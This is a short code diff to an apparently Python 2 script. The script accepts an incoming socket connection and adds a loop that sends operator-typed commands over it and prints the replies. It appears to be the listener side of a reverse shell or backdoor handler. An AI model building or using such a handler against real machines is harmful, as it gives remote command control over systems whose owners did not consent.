@@ -13,3 +13,9 @@ listener.listen(0)
 print "[+] Waiting for incoming connection"
 connection,address = listener.accept()
 print "[+] Got a connection from " + str(address)
+
+while True:
+    cmd = raw_input(">> ")
+    connection.send(cmd)
+    result = connection.recv(1024)
+    print result
